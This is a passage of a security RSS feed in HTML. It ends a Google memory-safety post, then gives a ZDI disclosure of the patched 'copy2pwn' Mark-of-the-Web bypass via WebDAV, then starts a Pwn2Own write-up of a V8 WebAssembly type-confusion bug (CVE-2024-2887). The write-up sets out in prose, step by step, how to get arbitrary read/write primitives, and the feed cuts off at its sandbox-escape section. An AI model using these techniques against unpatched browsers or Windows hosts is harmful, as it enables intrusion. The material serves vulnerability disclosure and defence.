href="https://security.googleblog.com/2024/02/improving-interoperability-between-rust-and-c.html"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">$1,000,000 grant to the Rust Foundation</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">, thereby advancing the development of a robust memory-safe ecosystem.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p>
  
  <h1 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 24pt;"><span style="color: #4285f4; font-family: Roboto, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Why we’re publishing this now</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">2022 marked the 50th anniversary of memory safety vulnerabilities. Since then, memory safety risks have grown more obvious. Like others', Google's internal vulnerability data and research show that memory safety bugs are widespread and one of the leading causes of vulnerabilities in memory-unsafe codebases. Those vulnerabilities endanger end users, our industry, and the broader society. We're encouraged to see governments also taking this issue seriously, as with the U.S. Office of the National Cyber Director publication of a </span><a href="https://www.whitehouse.gov/wp-content/uploads/2024/02/Final-ONCD-Technical-Report.pdf"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">paper</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> on the topic last week.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">By sharing our insights and experiences, we hope to inspire the broader community and industry to adopt memory-safe practices and technologies, ultimately making technology safer.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p>
  
  <h1 dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #4285f4; font-family: Roboto, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Our perspective</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">At Google, we have decades of experience addressing, at scale, large classes of vulnerabilities that were once similarly prevalent as memory safety issues. Our approach, which we call “</span><a href="https://research.google/pubs/pub53116/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Safe Coding</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">”, treats vulnerability-prone coding constructs&nbsp; themselves as hazards (i.e., independently of, and in addition to, the vulnerability they might cause), and is centered around ensuring developers do not encounter such hazards during regular coding practice.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"><span style="color: #434343;">Based on this experience, we expect that high assurance memory safety can only be achieved via a </span></span><span style="background-color: white; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"><a href="https://blog.google/technology/safety-security/tackling-cybersecurity-vulnerabilities-through-secure-by-design/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Secure-by-Design approach</span></a></span><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> centered around comprehensive adoption of languages with rigorous memory safety guarantees. As a consequence, we are considering a gradual transition towards memory-safe languages like Java, Go, and Rust.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Over the past decades, in addition to large Java and Go memory-safe codebases, Google has developed and accumulated hundreds of millions of lines of C++ code that is in active use and under active, ongoing development. This very large existing codebase results in significant challenges for a transition to memory safety:</span></p>
  <ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">We see no realistic path for an evolution of C++ into a language with rigorous memory safety guarantees that include temporal safety.</span></p></li>
  <li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">A large-scale rewrite of all existing C++ code into a different, memory-safe language appears very difficult and will likely remain impractical.</span></p></li></ul>
  <div><span style="color: #434343; font-family: Roboto, sans-serif;"></span></div><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 1pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">We consider it important to complement a transition to memory safe languages for new code and particularly at-risk components with safety improvements for existing C++ code, to the extent practicable. We believe that substantial improvements can be achieved through an incremental transition to a partially-memory-safe C++ language subset, augmented with hardware security features when available. For instance, see </span><a href="https://bughunters.google.com/blog/6368559657254912/llvm-s-rfc-c-buffer-hardening-at-google"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">our work improving spatial safety in GCP's networking stack</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">.</span></p>
  
  <h1 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 24pt;"><span style="color: #4285f4; font-family: Roboto, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Our investments in memory-safe languages</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">We are actively investing in many of the solutions outlined in our whitepaper and in our </span><a href="https://www.regulations.gov/comment/ONCD-2023-0002-0074"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">response</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> to the </span><a href="https://www.regulations.gov/document/ONCD-2023-0002-0001"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">US Federal Government’s RFI on Open Source Software Security</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">.</span></p>
  
  <ul style="margin-bottom: 1pt; margin-top: 1pt; padding-inline-start: 48px;">
  
  <li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; font-weight: 700; vertical-align: baseline;">Android</span><span style="font-size: 12pt; vertical-align: baseline;"> has written several components in Rust over the last few years, leading to </span><a href="https://security.googleblog.com/2022/12/memory-safe-languages-in-android-13.html"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">compelling security improvements</span></a><span style="font-size: 12pt; vertical-align: baseline;">. In Android’s Ultra-wideband (UWB) module, this has improved the security of the module while also reducing the memory usage and inter-procedural calls.&nbsp;</span></p></li></ul><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;">
  <li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; font-weight: 700; vertical-align: baseline;">Chrome</span><span style="font-size: 12pt; vertical-align: baseline;"> has </span><a href="https://groups.google.com/a/chromium.org/g/chromium-dev/c/UhwVDk4HZFA/m/UAA2D96QBAAJ"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">started shipping some features in Rust</span></a><span style="font-size: 12pt; vertical-align: baseline;">; in one case, Chrome was able to move its QR code generator out of a sandbox by adopting a new memory-safe library written in Rust, leading to </span><span style="font-size: 12pt; font-style: italic; vertical-align: baseline;">both</span><span style="font-size: 12pt; vertical-align: baseline;"> better security and better performance.</span></p></li></ul>
  <ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">Google recently announced a </span><a href="https://security.googleblog.com/2024/02/improving-interoperability-between-rust-and-c.html"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">$1,000,000 grant to the Rust foundation</span></a><span style="font-size: 12pt; vertical-align: baseline;"> to enhance interoperability with C++ code. This will facilitate incremental adoption of Rust in existing memory-unsafe code bases, which will be key to enabling even more new development to occur in a memory-safe language. Relatedly, we are also working on addressing </span><a href="https://bughunters.google.com/blog/4805571163848704/llvm-cfi-and-cross-language-llvm-cfi-support-for-rust"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">cross-language attacks</span></a><span style="font-size: 12pt; vertical-align: baseline;"> that can occur when mixing Rust and C++ in the same binary.</span></p></li></ul>
  <ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">Google is investing in building the memory-safe open-source ecosystem through </span><a href="https://www.memorysafety.org/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">ISRG Prossimo</span></a><span style="font-size: 12pt; vertical-align: baseline;"> and </span><a href="https://alpha-omega.dev/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">OpenSSF’s Alpha-Omega project</span></a><span style="font-size: 12pt; vertical-align: baseline;">. Back in 2021, we funded </span><a href="https://www.memorysafety.org/blog/supporting-miguel-ojeda-rust-in-linux/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">efforts to bring Rust to the Linux Kernel</span></a><span style="font-size: 12pt; vertical-align: baseline;">, which is now enabling us to write </span><a href="https://lore.kernel.org/lkml/20231101-rust-binder-v1-0-08ba9197f637@google.com/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">memory-safe drivers</span></a><span style="font-size: 12pt; vertical-align: baseline;">. This funding is also going towards providing alternatives or upgrades to key open-source libraries in a memory-safe language, such as providing a </span><a href="https://www.memorysafety.org/blog/rustls-and-rust-for-linux-funding-openssf/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">memory safe TLS implementation</span></a><span style="font-size: 12pt; vertical-align: baseline;">.</span></p></li></ul><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"></p>
  <p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">We know that memory safe languages will not address every security bug, but just as our efforts to </span><a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">eliminate XSS attacks through tooling showed</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">, removing large classes of exploits both directly benefits consumers of software and allows us to move our focus to addressing further classes of security vulnerabilities.</span></p>
  
  <p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">To access the full whitepaper and learn more about Google's perspective on memory safety, visit </span><a href="https://research.google/pubs/secure-by-design-googles-perspective-on-memory-safety/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">https://research.google/pubs/secure-by-design-googles-perspective-on-memory-safety/</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> </span></p></span></div>
]]></content:encoded>
<pubDate>2024-03-08T05:12:51.193-05:00</pubDate>
</item>
<item>
<title>CVE-2024-38213: Copy2Pwn Exploit Evades Windows Web Protections</title>
<link>https://www.thezdi.com/blog/2024/8/14/cve-2024-38213-copy2pwn-exploit-evades-windows-web-protections</link>
<guid>https://www.thezdi.com/blog/2024/8/14/cve-2024-38213-copy2pwn-exploit-evades-windows-web-protections</guid>
<content:encoded><![CDATA[
<p class=""><em>Zero Day Initiative threat researchers discovered CVE-2024-38213, a simple and effective way to bypass Windows mark-of-the-web protections leading to remote code execution.</em></p><p class="">In March 2024, Trend Micro’s Zero Day Initiative Threat Hunting team started analyzing samples connected to the activity carried out by DarkGate operators to infect users through copy-and-paste operations. This DarkGate campaign was an update from a <a href="https://www.trendmicro.com/en_us/research/24/c/cve-2024-21412--darkgate-operators-exploit-microsoft-windows-sma.html">previous campaign</a>&nbsp; in which the DarkGate operators were exploiting a zero-day vulnerability, <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21412">CVE-2024-21412</a>, which we disclosed to Microsoft earlier this year. </p><p class="">The investigation into this campaign directly influenced further vulnerability research into Windows Defender SmartScreen and how files originating from WebDAV shares are handled during copy-and-paste operations. As a result, we discovered and reported CVE-2024-38213 to Microsoft, which they patched in June. This exploit, which we've named copy2pwn, results in a file from a WebDAV share being copied locally without Mark-of-the-Web protections.</p><h2>What is Web-based Distributed Authoring and Versioning (WebDAV)?</h2><p class="">Web-based Distributed Authoring and Versioning (WebDAV) is an extension to the Hypertext Transfer Protocol (HTTP). It provides added functionality to HTTP, including features such as authoring, sharing, and versioning.</p>





















  
  



<p>Since WebDAV is based on HTTP, WebDAV shares can be accessed through a web browser using the HTTP protocol, for example, at <code>http://10.37.129.2/example_webdav_folder/somefile</code>. When a file is downloaded from a WebDAV share using a browser such as Microsoft Edge or Google Chrome, it is treated the same as any other file downloaded from the web. As expected, the local copy of the file is marked with the Mark-of-the-Web.  </p>
<p>On Windows, users can also access and mount WebDAV shares via UNC paths, such as <code>\\10.37.129.2@80\example_webdav_folder</code>. A user can browse to a path of this form using Windows Explorer. This functions in a similar manner to accessing SMB shares through Windows. When accessing files in this manner, they are handled directly by the Windows operating system and not by the browser.</p>




  <h2>Threat Actors and WebDAV Shares</h2><p class="">Recently, we’ve seen an increase in threat actors hosting payloads on WebDAV shares. This activity has led to the discovery of numerous vulnerabilities abused as zero-days clustered around accessing malicious payloads from WebDAV shares. These include vulnerabilities such as <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36025">CVE-2023-36025</a> and, more recently, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21412">CVE-2024-21412</a>, with an additional fix from Microsoft in the form of <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29988">CVE-2024-29988</a>. These vulnerabilities center around Mark-of-the-Web bypasses and evading built-in Microsoft protections such as Windows Defender SmartScreen. </p><p class="">As mentioned, WebDAV shares accessed through Windows Explorer are handled by the Windows operating system as opposed to a browser. &nbsp;Many threat actors are aware of the implications of this with regard to Mark-of-the-Web. During our threat-hunting investigations, we uncovered many threat actors deploying an easy method utilizing the Windows search protocol to open WebDAV searches through Windows Explorer.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="320" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/a0bf33b9-5251-48ca-844b-3b237b5676c4/Picture1.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 1 – Search query logic that opens a WebDAV share through Windows Explorer</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">When accessed with a web browser, this prompts the user to open the WebDAV share in Windows Explorer.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="400" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/46bf00a8-6e4b-4312-ae7e-30b0c6edb7dd/Picture2.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 2 – Microsoft Edge prompts users to open the WebDAV share in Windows Explorer</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">Using the logic from Figure 1, threat actors can exercise a high degree of control over what the end user sees on the WebDAV share. This is done by crafting a specific Windows search query that only displays those files the threat actor wants the user to see. Furthermore, by utilizing certain file types such as Internet Shortcut (.url) or Shortcut (.lnk), the threat actor may change the file icon to make it appear as if the malicious file is a completely different type. This lures the user into inadvertently executing scripts or binaries.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="326" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/50321cca-e6cc-448f-af6a-84cfa5708a87/Picture3.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 3 – The Windows Explorer window is crafted to only display poc.lnk.zip</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">Under normal circumstances, files served over WebDAV would receive the Mark-of-the-Web and Windows Defender SmartScreen protections. However, there are a cluster of vulnerabilities mentioned above, and possibly more, that can be used for evasion.</p><h2>The Importance of Mark-of-the-Web (MotW) Protections</h2>





















  
  



<p>When a user downloads a file from an untrusted source such as the web, Windows adds the Mark-of-the-Web to the local copy of the file. The Mark-of-the-Web consists of an NTFS Alternate Data Stream (ADS) with the name Zone.Identifier. Within this stream is the text <code>ZoneId=3</code>, indicating that the file originated from an untrusted source.</p>












































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="259" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/51e7f8e8-9e59-493b-8436-fe2d675b3d7e/Picture4.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 4 – ZoneId=3 is applied to files that originate from an untrusted source</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">The presence of the Mark-of-the-Web triggers additional security checks and prompts when opening the file. This helps reduce the risk of executing untrusted content. </p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="390" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/268e104b-dfc7-4f77-aeae-81e8eae67d75/Picture5.png?format=1000w" width="596" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 5 – A security prompt shown due to the presence of the Mark-of-the-Web</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">The Mark-of-the-Web is also needed for the functioning of other key protection mechanisms:</p><p class="">·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows Defender SmartScreen, which examines files based on reputation and signature<br />·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Office Protected View, which protects users from threats such as malicious macros and Dynamic Data Exchange (DDE) attacks.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
          
            
                
                
                
                
                
                
                
                <img alt="" height="722" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/8ec7cd59-a472-4c43-8110-5d3ed7e8b9ab/Picture6.png?format=1000w" width="772" />

            
          
        
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 6 – A Windows Defender SmartScreen prompt</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">Unfortunately, threat actors have discovered that Windows does not always handle or properly apply the Mark-of-the-Web to files served over WebDAV. Historically, Windows has treated WebDAV shares more akin to SMB shares, as opposed to HTTP web servers. This can be quite dangerous.</p><h2>Bypassing Mark-of-the-Web Protections with CVE-2024-38213</h2><p class="">Before the release of the Microsoft June security patch, files copied and pasted from WebDAV shares did not receive the Mark-of-the-Web designations. This meant that users might copy and paste files from a WebDAV share to their desktop, and those files could subsequently be opened without the protections of Windows Defender SmartScreen or Microsoft Office Protected View. In particular, this means that there would be no reputation or signature checks on executables.</p>





















  
  






  <p class="">Copy and paste operations are ubiquitous so Windows users need to ensure that they are fully protected from <a href="https://www.geeksforgeeks.org/clipboard-hijacking-attack/" target="_blank" title="https://www.geeksforgeeks.org/clipboard-hijacking-attack/">clipboard hijacking</a>, <a href="https://www.geeksforgeeks.org/what-is-pastejacking/" target="_blank" title="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>&nbsp;, and copy2pwn attacks, especially in light of recent threat actor activity leveraging WebDAV shares for payload deployment.</p><h2>Conclusion</h2><p class="">The Zero Day Initiative Threat Hunting Team constantly monitors for new and emerging zero-day threats. During our analysis of existing and previous threat actors and APT activities, we often discover new tactics, techniques, procedures, and hidden zero-day vulnerabilities. </p><p class="">This case emphasizes the integration of ZDI threat hunting with proactive vulnerability research within the ZDI program. By combining threat research with the Zero Day Initiative's core vulnerability research program, the ZDI Threat Hunting Team can develop new adversarial models and simulate new attack strategies as they might occur in the real world. This integration enables us to protect and defend customers from potentially hidden attack methods and chains before threat actors can incorporate them into their attack strategies.</p><p class="">We’ll be back with more findings as we have them. Until then, follow the team on <a href="https://www.twitter.com/thezdi">Twitter</a>, <a href="https://infosec.exchange/@thezdi">Mastodon</a>, <a href="https://www.linkedin.com/company/zerodayinitiative">LinkedIn</a>, or <a href="https://www.instagram.com/thezdi">Instagram</a> for the latest in exploit techniques and security patches.</p>
]]></content:encoded>
<pubDate>Thu, 15 Aug 2024 15:41:52 +0000</pubDate>
</item>
<item>
<title>CVE-2024-2887: A Pwn2Own Winning Bug in Google Chrome</title>
<link>https://www.thezdi.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome</link>
<guid>https://www.thezdi.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome</guid>
<content:encoded><![CDATA[
<p class=""><em>In this guest blog from Master of Pwn winner Manfred Paul, he details CVE-2024-2887 – a type confusion bug that occurs in both Google Chrome and Microsoft Edge (Chromium). He used this bug as a part of his winning exploit that led to code execution in the renderer of both browsers. This bug was quickly patched by both </em><a href="https://chromereleases.googleblog.com/2024/03/stable-channel-update-for-desktop_26.html"><em>Google</em></a><em> and </em><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-2887"><em>Microsoft</em></a><em>. Manfred has graciously provided this detailed write-up of the vulnerability and how he exploited it at the contest.</em></p>





















  
  



<hr /><p>In this blog, I describe a means of exploiting the V8 JavaScript and WebAssembly engine to gain execution of arbitrary shellcode inside the renderer process. This includes a bypass of the V8 memory sandbox (<a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf">Ubercage</a>), though code execution is still constrained by the process isolation-based browser sandbox. For demonstration purposes, this limitation can be removed by running the browser with the <code>--no- sandbox</code> flag. </p>
<p><b>Root Cause of the WebAssembly Universal Type Confusion</b></p>
<p>A WebAssembly module may contain a <code>type</code> section that defines a list of custom “heap types”. In the base specification, this is used only to declare function types, but with the adoption of the garbage collection (GC) <a href="https://webassembly.github.io/gc/core/_download/WebAssembly.pdf">proposal</a> [PDF], this section can additionally define struct types, allowing for the use of composite, heap-allocated types in WebAssembly. </p>
<p>Normally, a struct declared in this section may only reference structs that precede it  (structs with a lower type index). To support mutually recursive data structures, a feature called recursive type groups is available. Instead of declaring the (potentially) mutually recursive types as individual entries in the type section, a recursive group is declared as a single type section entry. Within this group, individual types are declared, which are thereby allowed to reference each other.</p>
<p>With this in mind, consider the function responsible for parsing the <code>type</code> section from the binary WebAssembly format in <code>v8/src/wasm/module-decoder-impl.h</code>: </p>

<p>At (1), the limit <code>kV8MaxWasmTypes</code> (currently equal to 1,000,000) is passed as a maximum to <code>consume_count()</code>, ensuring that at most this many entries are read from the <code>type</code> section. When recursive type groups were added, this check became insufficient. While this code will permit only <code>kV8MaxWasmTypes</code> entries of the <code>type</code> section to be read, each of those can potentially be a recursive type group containing more than one individual type definition. </p>
<p>This insufficiency was clearly noticed at the time of this change, as together with recursive type groups a second check was added at (2). Here, for each recursive type group, it is checked that the addition of the constituent types would not exceed the <code>kV8MaxWasmTypes</code> limit. </p>
<p>However, this second check is still not enough. While it protects the indices of each type allocated inside a recursive group, the presence of those groups also has implications for types declared outside this group, as each recursive group adds to the total count of declared types. </p>
<p>To make this clearer, imagine a type section consisting of two entries: one recursive group containing<code>kV8MaxWasmTypes</code> entries, and following that group, one non-recursive type. The check at (1) is passed, as the section only has two entries. While processing the recursive group, the check at (2) is also passed, as the section has exactly <code>kV8MaxWasmTypes</code> entries. For the following single type, there is no further check: at (3) the type is simply allocated at the next free index. In this case, the index will be  <code>kV8MaxWasmTypes</code>, exceeding the usual maximum of <code>kV8MaxWasmTypes-1</code>. If there were more than one non-recursive type at the end of the <code>type</code> section, they would similarly get assigned <code>kV8MaxWasmTypes+1</code>, <code>kV8MaxWasmTypes+2</code>, and so forth, as type indices. </p>
<p><b>Impact of the Root Cause</b></p>
<p>Exceeding the maximal number of declared heap types might seem like a very harmless resource exhaustion bug at first. However, due to some internal details of how V8 handles WebAssembly heap types, it directly allows constructing some very powerful exploit primitives. </p>
<p>In <code>v8/src/wasm/value-type.h</code>, the encoding of heap types is defined: </p>

<p>Here, V8 assumes that all user-defined heap types will be assigned indices smaller than <code>kV8MaxWasmTypes</code>. Larger indices are reserved for fixed, internal heap types (beginning with <code>kFunc</code>). This results in our own type declarations aliasing one of these internal types, leading to many opportunities for type confusion. </p>
<p><b>Universal WebAssembly Type Confusion</b></p>
<p>To leverage this encoding ambiguity into a full type confusion, let’s first consider the <code>struct.new</code> opcode, which produces a reference to a new struct created from fields given on the stack. The caller specifies the desired struct type by passing its type index. The relevant check on the type index can be found in <code>v8/src/wasm/function-body-decoder-impl.h</code>:</p>

<p>Following the validation logic into the <code>has_struct()</code> method from <code>v8/src/wasm/wasm-module.h</code>: </p>

<p>Since we can make <code>types.size()</code>  exceed the usual limit of <code>kV8MaxWasmTypes</code>, we can make the check pass even if when passing an index larger than this value. This allows us to create a reference of an arbitrary internal type that points to the struct we can freely define. </p>
<p>On the other hand, consider now the handling of the <code>ref.cast</code> instruction: </p>

<p>Here, a <code>type</code> check elimination is performed. If <code>TypeCheckAlwaysSucceeds</code> returns true, then no actual <code>type</code> check is emitted and the value is simply reinterpreted as the target <code>type</code>.</p>
<p>The function <code>TypeCheckAlwaysSucceeds</code> ultimately calls <code>IsHeapSubtypeOfImpl</code> defined in <code>v8/src/wasm/wasm-subtyping.cc</code>:</p>

<p>This means that if our declared type index aliases the constant <code>HeapType::kNone</code>, the type check will always be elided if we cast to any non-function, non-external reference. In combination, we can use this to turn any reference type into any other by the following steps: </p>
<ol>
<li><p>   In the type section, define a structure type with a single field of type <code>anyref</code>, and make this struct have a type index equal to <code>HeapType::kNone</code> using the bug described above. </p>
</li>
<li><p>   Place a non-null reference value of any type on the top of the stack and call <code>struct.new</code> with the type index set to <code>HeapType::kNone</code>. This will succeed, as <code>has_struct()</code> validates the index against the index established via the previous step. </p>
</li>
<li><p>   Also, declare a struct with a normal type index lower than <code>kV8MaxWasmTypes</code> with a single field of the target reference type. Call <code>ref.cast</code> with this  this struct’s type index. The engine will not perform any type check, as the input value is at this point understood to be reference type <code>HeapType::kNone</code>.</p>
</li>
<li><p>   Finally, read back the reference stored in the struct by executing <code>struct.get</code>.</p>
</li>
</ol>
<p>This arbitrary casting of reference types allows transmuting any value type into any other by referencing it, changing the reference type, and then dereferencing it – a universal type confusion. </p>
<p>In particular, this directly contains nearly all usual JavaScript engine exploitation primitives as special cases:</p>
<p>•	Transmuting <code>int</code> to <code>int*</code> and then dereferencing results in an arbitrary read.</p>
<p>•	Transmuting <code>int</code> to <code>int*</code> and then writing to that reference results in an arbitrary write.</p>
<p>•	Transmuting <code>externref</code>to <code>int</code> is the <code>addrOf()</code> primitive, obtaining the address of a JavaScript object.</p>
<p>•	Transmuting <code>int</code> to <code>externref</code> is the <code>fakeObj()</code> primitive, forcing the engine to treat an arbitrary value as a pointer to a JavaScript object. </p>
<p>While casting from <code>HeapType::kNone</code> to an <code>externref</code> is not allowed, remember that we are actually operating on one more level of indirection - transmuting to <code>externref</code> involves casting to a reference to a struct containing one <code>externref</code> member.</p>
<p>Note however that these “arbitrary” reads and writes are still contained in the V8 memory sandbox, as all involved pointers to heap-allocated structures are tagged, compressed pointers inside the heap cage, not full 64-bit raw pointers. </p>
<p><b>Integer Underflow Leading to V8 Sandbox Escape</b> </p>
